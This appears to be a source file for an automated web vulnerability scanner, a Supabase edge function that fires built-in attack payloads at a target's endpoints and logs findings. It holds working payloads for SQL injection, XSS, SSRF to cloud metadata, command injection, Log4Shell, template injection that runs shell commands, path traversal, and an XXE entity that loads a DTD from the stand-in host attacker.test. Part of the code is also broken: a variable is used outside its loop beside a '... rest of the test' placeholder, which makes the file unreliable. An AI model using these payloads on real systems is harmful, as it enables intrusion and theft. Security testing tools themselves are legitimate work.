import { corsHeaders } from "https://esm.sh/@supabase/supabase-js@2.95.0/cors";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.95.0";
import { recordFinding } from "../_shared/findings-writer.ts";
import { mintOobToken } from "../_shared/oob.ts";

// Per-request budget (edge functions are capped at 150s idle timeout).
// We keep a hard ceiling well under that so we always return a 200 with partial results.
let SCAN_START = Date.now();
const MAX_MS = 110000;
const timeLeft = () => MAX_MS - (Date.now() - SCAN_START);

// 🧠 Adaptive learning — record what worked so next runs prioritise it.
async function recordLesson(db: any, targetId: string, vc: string, strategy: string, payload: string, ok: boolean, notes: string) {
  try {
    const hash = await crypto.subtle.digest("SHA-1", new TextEncoder().encode(payload))
      .then(b => Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, "0")).join(""));
    await db.from("adaptive_lessons").insert({
      target_id: targetId, vuln_class: vc, strategy, payload_hash: hash.slice(0, 24),
      succeeded: ok, notes: notes.slice(0, 200),
    });
  } catch { /* ignore */ }
}

// 🪤 Deterministic proof token — appears in payload AND can be grepped from response
const PROOF_TOKEN = "CYBERSCOPE_PROVEN";

async function safeFetch(url: string, opts: RequestInit = {}, ms = 6000): Promise<Response> {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), ms);
  try {
    return await fetch(url, { ...opts, signal: ctrl.signal });
  } finally {
    clearTimeout(timer);
  }
}

// ─── PRO-LEVEL FUZZ CORPUS ──────────────────────────────
// Multi-strategy: grammar-based, mutation-based, polyglot, encoding chains, time-based.
const FUZZ_GRAMMARS: Record<string, string[]> = {
  sqli_advanced: [
    "' AND (SELECT 1 FROM (SELECT SLEEP(3))a)--",
    "' AND IF(1=1,SLEEP(3),0)--",
    "1' UNION SELECT NULL,@@version,NULL--",
    "1) AND (SELECT * FROM(SELECT(SLEEP(3)))a)--",
    "'||(SELECT pg_sleep(3))||'",
    "1; WAITFOR DELAY '0:0:3'--",
    "1' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "%27%20UNION%20SELECT%20NULL%2C%40%40version%2CNULL--",
  ],
  xss_polyglot: [
    `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e`,
    `"><svg/onload=alert(/XSS/)>`,
    `<details open ontoggle=alert(1)>`,
    `<img src=x onerror="javascript:alert(1)">`,
    `<iframe srcdoc="<svg onload=alert(1)>">`,
    `<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]>`,
  ],
  ssrf_advanced: [
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]:80/",
    "http://localhost:6379/info",
    "http://0.0.0.0:8080/",
    "gopher://127.0.0.1:6379/_INFO",
    "http://127.1/",
    "http://0177.0.0.1/",
    "http://2130706433/",
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/stat",
  ],
  cmdi_advanced: [
    "; sleep 3 #",
    "| sleep 3",
    "&& sleep 3",
    "$(sleep 3)",
    "`sleep 3`",
    ";sleep${IFS}3",
    "%0Asleep+3%0A",
    "|| timeout 3",
    "& ping -c 3 127.0.0.1",
  ],
  xxe_advanced: [
    `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
    `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.test/x.dtd">%p;]><r/>`,
    `<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://169.254.169.254/">`,
  ],
  ssti_advanced: [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "#{7*7}",
  ],
  nosqli_advanced: [
    `{"$ne": null}`,
    `{"$gt": ""}`,
    `{"$where": "sleep(3000)"}`,
    `{"$regex": ".*"}`,
    `';return true;//`,
  ],
  path_traversal_advanced: [
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "%252e%252e%252fetc%252fpasswd",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "/proc/self/environ",
    "C:\\windows\\win.ini",
  ],
  header_injection: [
    "test\r\nX-Injected: 1",
    "test%0d%0aX-Injected:%201",
    "test\nLocation: https://evil.test",
    "test%0aSet-Cookie:%20pwn=1",
  ],
  log4shell: [
    "${jndi:ldap://oob.cyberscope.test/x}",
    "${${lower:j}ndi:${lower:l}dap://oob.cyberscope.test/x}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://oob.cyberscope.test/x}",
  ],
  graphql_introspection: [
    "{__schema{types{name,fields{name}}}}",
    "query{__type(name:\"User\"){fields{name,type{name}}}}",
  ],
};


// Genetic mutation operators
function mutate(seed: string): string[] {
  const variants: string[] = [];
  // Case toggle
  variants.push(
    seed
      .split("")
      .map((c, i) => (i % 2 ? c.toUpperCase() : c.toLowerCase()))
      .join(""),
  );
  // Comment injection (SQL/JS)
  variants.push(seed.replace(/ /g, "/**/"));
  // Double URL encode
  variants.push(encodeURIComponent(encodeURIComponent(seed)));
  // Null byte
  variants.push(seed + "%00");
  // Unicode escape
  variants.push(seed.replace(/[a-z]/gi, (c) => `\\u00${c.charCodeAt(0).toString(16).padStart(2, "0")}`));
  return variants.slice(0, 6);
}

interface FuzzResult {
  url: string;
  vulnClass: string;
  payload: string;
  strategy: string;
  baselineStatus: number;
  probeStatus: number;
  bodyDeltaPct: number;
  responseTimeMs: number;
  anomaly: boolean;
  signal: "high" | "medium" | "low" | "none";
  notes: string;
}

async function fuzzEndpoint(
  url: string,
  vulnClass: string,
  payloads: string[],
  strategy: string,
  knownParams?: string[],
): Promise<FuzzResult[]> {
  const results: FuzzResult[] = [];

  // Baseline
  let baselineStatus = 0, baselineLen = 0, baselineMs = 0, baselineBody = "";
  try {
    const t0 = Date.now();
    const r = await safeFetch(url, { method: "GET", headers: { "User-Agent": "CyberScope-ProFuzz/1.0" } }, 5000);
    baselineMs = Date.now() - t0;
    baselineStatus = r.status;
    baselineBody = await r.text();
    baselineLen = baselineBody.length;

  } catch {
    /* ignore */
  }

  for (const payload of payloads) {
  if (timeLeft() < 4000) break;
  const stampedPayload = /CYBERSCOPE_PROVEN/.test(payload) ? payload
  : payload.replace(/alert\([^)]*\)/g, `alert('${PROOF_TOKEN}')`);

  // Inject into EVERY known parameter, not just hardcoded "q"
  const urlObj = new URL(url);
  const existingParams = [...urlObj.searchParams.keys()];
  const injectParams = existingParams.length > 0 ? existingParams
    : (knownParams && knownParams.length > 0) ? knownParams
    : ["q", "id", "search", "page", "url", "redirect", "file", "path", "input", "name", "query", "s"];

  for (const injectParam of injectParams.slice(0, 5)) {
    const u = new URL(url);
    u.searchParams.set(injectParam, stampedPayload);
    const probeUrl = u.toString();
    try {
      const t0 = Date.now();
      const r = await safeFetch(probeUrl, { method: "GET", headers: { "User-Agent": "CyberScope-ProFuzz/1.0" } }, 5000);
      const ms = Date.now() - t0;
      const body = await r.text().catch(() => "");
      const delta = baselineLen > 0 ? Math.abs(body.length - baselineLen) / baselineLen : 0;

      // Time-based detection (sleep 3 in payload)
      const timeBased = /sleep\s*\(?\s*3|pg_sleep|WAITFOR|timeout 3|ping -c 3/i.test(payload);
      const timeAnomaly = timeBased && ms > baselineMs + 2500;

      const statusAnomaly = r.status >= 500 || (r.status !== baselineStatus && delta > 0.2);
      const bodyAnomaly = delta > 0.3;
      // 🔥 EXPLOITED tier — reflected payload appears un-encoded in body (deterministic proof)
      const isXssClass = /xss/i.test(vulnClass);
      const reflectedRaw = isXssClass
     && stampedPayload.length > 6
     && body.includes(stampedPayload)
     && !baselineBody.includes(stampedPayload);  // ← critical false-positive guard
      const errLeak = /SQL syntax|ORA-\d+|MySQL|PostgreSQL|stack trace|Traceback|System\.Data\.SqlClient/i.test(body);
      const anomaly = timeAnomaly || statusAnomaly || bodyAnomaly || errLeak || reflectedRaw;
      const signal: FuzzResult["signal"] = reflectedRaw || errLeak ? "high" : anomaly ? "medium" : "none";
      results.push({
        url: probeUrl, vulnClass, payload: stampedPayload, strategy,
        baselineStatus, probeStatus: r.status,
        bodyDeltaPct: Number((delta * 100).toFixed(2)),
        responseTimeMs: ms, anomaly, signal,
        notes: anomaly
          ? `${reflectedRaw ? "REFLECTED-RAW " : ""}${timeAnomaly ? "TIME " : ""}${errLeak ? "ERROR-leak " : ""}${statusAnomaly ? "STATUS " : ""}${bodyAnomaly ? "BODY-delta" : ""}`.trim()
          : "no anomaly",
      });
    } catch (e) {
      results.push({
        url: probeUrl,
        vulnClass,
        payload,
        strategy,
        baselineStatus,
        probeStatus: 0,
        bodyDeltaPct: 0,
        responseTimeMs: 0,
        anomaly: false,
        signal: "none",
        notes: `error: ${(e as Error).message}`,
      });
    }
  }

  // ── Advanced: JSON-body POST fuzzing (catches APIs that ignore query strings) ──
  for (const payload of payloads.slice(0, 4)) {
    if (timeLeft() < 4000) break;
    try {
      const body = JSON.stringify({ q: payload, input: payload, search: payload, id: payload });
      const t0 = Date.now();
      const r = await safeFetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": "CyberScope-ProFuzz/1.0" },
        body,
      }, 5000);
      const ms = Date.now() - t0;
      const text = await r.text().catch(() => "");
      const delta = baselineLen > 0 ? Math.abs(text.length - baselineLen) / baselineLen : 0;
      const timeBased = /sleep|pg_sleep|WAITFOR|timeout 3/i.test(payload);
      const errLeak = /SQL syntax|ORA-\d|MySQL|PostgreSQL|stack trace|Traceback/i.test(text);
      const anomaly = (timeBased && ms > baselineMs + 2500) || r.status >= 500 || delta > 0.3 || errLeak;
      if (anomaly || r.status !== 404) {
        results.push({
          url, vulnClass, payload: `[JSON-BODY] ${payload}`, strategy: `${strategy}+json-body`,
          baselineStatus, probeStatus: r.status,
          bodyDeltaPct: Number((delta * 100).toFixed(2)),
          responseTimeMs: ms, anomaly,
          signal: anomaly ? (errLeak ? "high" : "medium") : "none",
          notes: anomaly ? "json-body anomaly" : "json-body baseline",
        });
      }
    } catch { /* skip */ }
  }
  return results;
}


// Test CVE templates from intel_feeds against target endpoints — emits per-template scan_logs
async function testCveTemplates(
  db: ReturnType<typeof createClient>,
  targetId: string,
  endpoints: Array<{ url: string }>,
): Promise<{ tested: number; confirmed: number; failed: number; details: Array<Record<string, unknown>> }> {
  // Pull target tech-stack for filtering (gap 2).
  const { data: tgt } = await db.from("target_workspaces").select("tech_stack, detected_tech, domain").eq("id", targetId).maybeSingle();
  const stackBlob = JSON.stringify(((tgt as any)?.tech_stack || {})).toLowerCase() + " " + JSON.stringify(((tgt as any)?.detected_tech || [])).toLowerCase();
  const techMatches = (affected: string[] | null): boolean => {
    if (!affected || affected.length === 0) return true; // unknown affected → keep
    return affected.some((t) => t && stackBlob.includes(String(t).toLowerCase()));
  };

  const { data: feeds } = await db
    .from("intel_feeds")
    .select("id, title, vulnerability_class, extracted_payloads, severity, source_url, source, affected_tech_stack")
    .not("extracted_payloads", "is", null)
    .order("ingested_at", { ascending: false })
    .limit(100);

  if (!feeds || feeds.length === 0) {
    await db.from("scan_logs").insert({
      target_id: targetId,
      log_type: "info",
      message: `📡 Intel templates: 0 available in intel_feeds — run Intel Sync first.`,
    });
    return { tested: 0, confirmed: 0, failed: 0, details: [] };
  }

  // Apply tech-stack filter unless the class is generic (allowlist).
  const GENERIC_CLASSES = new Set(["sqli", "rxss", "xss", "ssrf", "ssti", "lfi", "cmdi", "path-traversal", "auth-bypass", "xxe", "open-redirect"]);
  const filteredFeeds = feeds.filter((f: any) => {
    const vc = (f.vulnerability_class || "").toLowerCase();
    if (GENERIC_CLASSES.has(vc)) return true;
    return techMatches(f.affected_tech_stack as string[] | null);
  });
  const skipped = feeds.length - filteredFeeds.length;
  if (skipped > 0) {
    await db.from("scan_logs").insert({
      target_id: targetId, log_type: "info",
      message: `🎯 Tech-stack filter: ${skipped}/${feeds.length} CVE templates skipped (no overlap with detected stack)`,
      metadata: { skipped, kept: filteredFeeds.length },
    });
  }

  await db.from("scan_logs").insert({
    target_id: targetId,
    log_type: "action",
    message: `📡 Testing ${filteredFeeds.length} CVE templates from intel_feeds against ${Math.min(endpoints.length, 3)} live endpoints`,
    metadata: { templateCount: filteredFeeds.length, endpointCount: Math.min(endpoints.length, 3) },
  });

  const details: Array<Record<string, unknown>> = [];
  let tested = 0,
    confirmed = 0,
    failed = 0;

  for (const feed of filteredFeeds) {
    if (timeLeft() < 5000) {
      await db.from("scan_logs").insert({
        target_id: targetId,
        log_type: "info",
        message: `⏱️ Template testing halted at ${tested}/${filteredFeeds.length} — time budget exhausted.`,
      });
      break;
    }
    const payloads = (feed.extracted_payloads as string[] | null) || [];
    if (payloads.length === 0) {
      const vc = (feed.vulnerability_class || "").toLowerCase();
      // Gap 3: only synthesize fallbacks for generic classes; otherwise skip honestly.
      if (!GENERIC_CLASSES.has(vc)) {
        await db.from("scan_logs").insert({
          target_id: targetId, log_type: "info",
          message: `⏭️ Skipped "${(feed.title || "").slice(0, 60)}" [${vc}] — no real payloads, class not generic`,
        });
        continue;
      }
      const FALLBACKS: Record<string, string[]> = {
        sqli: ["' OR '1'='1", "1 AND SLEEP(3)--", "' UNION SELECT NULL,NULL--"],
        rxss: ["<svg onload=alert(1)>", '"><script>alert(1)</script>'],
        xss:  ["<svg onload=alert(1)>", '"><script>alert(1)</script>'],
        ssrf: ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22"],
        ssti: ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
        lfi: ["../../../../etc/passwd", "....//....//etc/passwd"],
        cmdi: ["; id", "| whoami", "$(id)"],
        "path-traversal": ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"],
        xxe: ["<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>"],
        "auth-bypass": ["' OR '1'='1", "admin'--", "' OR 1=1--"],
        "open-redirect": ["//evil.test", "https://evil.test"],
      };
      const synth = FALLBACKS[vc] || FALLBACKS["sqli"];
      payloads.push(...synth);
    }


    let templatePassed = false;
    const perEndpoint: Array<{ url: string; status: number; matched: boolean; reason: string }> = [];

    for (const ep of endpoints.slice(0, 8)) {
      if (timeLeft() < 4000) break;
      const payload = payloads[0];
      const sep = ep.url.includes("?") ? "&" : "?";
      const { data: epParams } = await db.from("discovered_endpoints").select("parameters").eq("url", ep.url).single();
      const params = Object.keys((epParams?.parameters as Record<string, string>) || {});
      const testParams = params.length > 0 ? params.slice(0, 3) : ["q", "id", "search"];

      for (const paramName of testParams) {
        const u = new URL(ep.url);
        u.searchParams.set(paramName, payload);
        const probeUrl = u.toString();
        // ... rest of the test
      }
      try {
        const r = await safeFetch(probeUrl, { headers: { "User-Agent": "CyberScope-CVE/1.0" } }, 5000);
        const body = await r.text().catch(() => "");
        tested++;
        const errLeak = /SQL syntax|stack trace|Exception|ORA-\d|MySQL|PostgreSQL/i.test(body);
        const matched = r.status >= 500 || errLeak;
        const reason = matched
          ? errLeak
            ? "error-leak in body"
            : `5xx status (${r.status})`
          : `no-anomaly (${r.status})`;
        perEndpoint.push({ url: ep.url, status: r.status, matched, reason });

        if (matched) {
          templatePassed = true;
          confirmed++;
          details.push({
            cveTitle: feed.title,
            vulnClass: feed.vulnerability_class,
            endpoint: ep.url,
            status: r.status,
            payload,
            severity: feed.severity,
            sourceUrl: feed.source_url,
          });
          await db.from("vulnerability_findings").insert({
            target_id: targetId,
            title: `[CVE Match] ${feed.title}`,
            severity: (feed.severity as "critical" | "high" | "medium" | "low" | "info") || "medium",
            payload,
            description: `Intel-feed CVE template matched on ${ep.url}. Source: ${feed.source_url}`,
            confidence_score: 65,
            confidence_level: "medium",
            validation_status: "cve_template_matched",
            triage_reasoning: `Advanced fuzzer matched CVE template "${feed.title}" against live endpoint. Reason: ${reason}.`,
          });
        } else {
          failed++;
        }
      } catch (e) {
        failed++;
        perEndpoint.push({
          url: ep.url,
          status: 0,
          matched: false,
          reason: `network: ${(e as Error).message.slice(0, 40)}`,
        });
      }
    }

    // Per-template result log line — visible in Neural Log
    const icon = templatePassed ? "✅" : "❌";
    const resultType: "result" | "info" = templatePassed ? "result" : "info";
    await db.from("scan_logs").insert({
      target_id: targetId,
      log_type: resultType,
      message: `${icon} [${feed.vulnerability_class || "unknown"}] "${(feed.title || "").slice(0, 80)}" — ${templatePassed ? "MATCH" : "no-match"} on ${perEndpoint.length} endpoints`,
      metadata: {
        feedId: feed.id,
        severity: feed.severity,
        source: feed.source,
        sourceUrl: feed.source_url,
        payload: payloads[0]?.slice(0, 200),
        perEndpoint,
        templatePassed,
      },
    });
  }

  return { tested, confirmed, failed, details };
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });

  SCAN_START = Date.now(); // reset per-request budget
  try {
    const { targetId } = await req.json().catch(() => ({}));
    if (!targetId) {
      return new Response(JSON.stringify({ ok: false, error: "targetId required" }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
        status: 200,
      });
    }

    const db = createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);

    const { data: target } = await db.from("target_workspaces").select("*").eq("id", targetId).single();
    if (!target) {
      return new Response(JSON.stringify({ ok: false, error: "target not found" }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
        status: 200,
      });
    }

    const { data: endpoints } = await db
      .from("discovered_endpoints")
     .select("url, method, parameters")
      .eq("target_id", targetId)
      .limit(250);
    if (!endpoints || endpoints.length === 0) {
      return new Response(JSON.stringify({ ok: false, error: "no endpoints — run recon first" }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
        status: 200,
      });
    }

    await db.from("scan_logs").insert({
      target_id: targetId,
      log_type: "info",
      message: `🚀 Pro-Level Fuzzer engaged on ${endpoints.length} endpoints (${Object.keys(FUZZ_GRAMMARS).length} strategies)`,
    });

    const allResults: FuzzResult[] = [];
    const summary: Record<string, { total: number; anomalies: number }> = {};
    // Round 1: CVE template execution from intel_feeds
    const cveReport = await testCveTemplates(db, targetId, endpoints);
    // Round 2: grammar-based payloads on first 40 endpoints
    for (const ep of endpoints.slice(0, 10)) {
      if (timeLeft() < 6000) break;
      for (const [vc, payloads] of Object.entries(FUZZ_GRAMMARS)) {
        if (timeLeft() < 5000) break;
        const epParams = Object.keys((ep as any).parameters || {});
const r = await fuzzEndpoint(ep.url, vc, payloads.slice(0, 12), "grammar", epParams);
        allResults.push(...r);
        summary[vc] = summary[vc] || { total: 0, anomalies: 0 };
        summary[vc].total += r.length;
        summary[vc].anomalies += r.filter((x) => x.anomaly).length;
      }
    }

    // Round 3: genetic mutation on top-signal payloads
    const topSignals = allResults.filter((r) => r.signal === "high" || r.signal === "medium").slice(0, 15);
    for (const seed of topSignals) {
      if (timeLeft() < 5000) break;
      const variants = mutate(seed.payload);
      const r = await fuzzEndpoint(seed.url.split("?")[0], seed.vulnClass, variants, "genetic-mutation");
      allResults.push(...r);
    }

    

    // ── Persist findings via central writer (auto-enqueues exploit-engine job)
    // Separate REFLECTED-RAW (deterministic proof = exploited tier) from heuristics.
    const exploited = allResults.filter((r) => /REFLECTED-RAW/.test(r.notes));
    const anomalies = allResults.filter((r) => r.signal === "high" && !/REFLECTED-RAW/.test(r.notes));

    for (const a of exploited.slice(0, 30)) {
      const res = await recordFinding({
        targetId,
        source: "advanced-fuzzer",
        category: a.vulnClass,
        vulnClass: a.vulnClass,
        severity: "high",
        title: `[EXPLOITED] Reflected ${a.vulnClass} via ${a.strategy}`,
        description: `Payload echoed un-encoded in response (proof token verified). ${a.url}`,
        payload: a.payload,
        proofTier: "exploited",
        autoEnqueueExploit: true,
        evidence: { url: a.url, status: a.probeStatus, bodyDeltaPct: a.bodyDeltaPct, notes: a.notes, proof_token: PROOF_TOKEN },
        request: { method: "GET", url: a.url },
        response: { status: a.probeStatus, body: `[proof token ${PROOF_TOKEN} reflected]` },
      });
      await recordLesson(db, targetId, a.vulnClass, a.strategy, a.payload, true, `exploited via ${a.strategy}, finding=${res.findingId}`);
    }

    for (const a of anomalies.slice(0, 30)) {
      const res = await recordFinding({
        targetId,
        source: "advanced-fuzzer",
        category: a.vulnClass,
        vulnClass: a.vulnClass,
        severity: "high",
        title: `[Pro-Fuzz] ${a.vulnClass} anomaly via ${a.strategy}`,
        description: `${a.notes} on ${a.url}. Status ${a.probeStatus}, ${a.bodyDeltaPct}% body delta, ${a.responseTimeMs}ms.`,
        payload: a.payload,
        proofTier: "suspected",
        autoEnqueueExploit: true,
        evidence: { url: a.url, status: a.probeStatus, bodyDeltaPct: a.bodyDeltaPct, responseTimeMs: a.responseTimeMs, notes: a.notes, strategy: a.strategy },
        request: { method: "GET", url: a.url },
      });
      await recordLesson(db, targetId, a.vulnClass, a.strategy, a.payload, !!res.findingId && !res.duplicate, a.notes);
    }

    // ── OOB-seeded blind-class probes (SSRF / XXE) — confirms via callback even when response is silent
    if (timeLeft() > 8000) {
      for (const ep of endpoints.slice(0, 5)) {
        const ssrfTok = mintOobToken({ targetId, vulnClass: "ssrf" });
        try {
          const sep = ep.url.includes("?") ? "&" : "?";
          const probe = `${ep.url}${sep}url=${encodeURIComponent(ssrfTok.httpUrl)}`;
          await safeFetch(probe, { headers: { "User-Agent": "CyberScope-OOB/1.0" } }, 4000);
          await db.from("oob_callbacks").insert({
            token: ssrfTok.token, target_id: targetId, callback_type: "http",
            payload_context: "advanced-fuzzer-ssrf", vuln_class: "ssrf",
          }).then(() => {}, () => {});
        } catch { /* ignore */ }
      }
    }
    await db.from("scan_logs").insert({
      target_id: targetId,
      log_type: "result",
      message: `✅ Pro-Fuzz complete — ${allResults.length} probes, ${anomalies.length} high-signal anomalies | 📡 Templates: ${cveReport.tested} tested, ${cveReport.confirmed} ✅ matched, ${cveReport.failed} ❌ no-match`,
      metadata: { summary, cveReport },
    });

    return new Response(
      JSON.stringify({
        ok: true,
        totalProbes: allResults.length,
        anomalies: anomalies.length,
        summary,
        cveReport,
        topResults: allResults.filter((r) => r.anomaly).slice(0, 20),
      }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 },
    );
  } catch (err) {
    return new Response(JSON.stringify({ ok: false, error: (err as Error).message }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
      status: 200,
    });
  }
});
